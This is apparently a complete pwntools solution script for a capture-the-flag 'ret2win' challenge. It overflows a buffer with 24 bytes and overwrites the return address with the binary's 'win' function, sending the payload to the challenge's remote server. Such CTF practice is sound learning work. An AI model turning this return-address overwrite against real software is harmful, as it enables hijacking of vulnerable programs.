from pwn import *

BIN_NAME = 'vuln'
REMOTE_ADDR = 'ret2win.chal.imaginaryctf.org'
REMOTE_PORT = 1337
LOCAL = False

chall = ELF(BIN_NAME)
context.binary = chall

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

payload = b'A' * 24 + pack(chall.symbols["win"])
stream.sendline(payload)

stream.interactive()
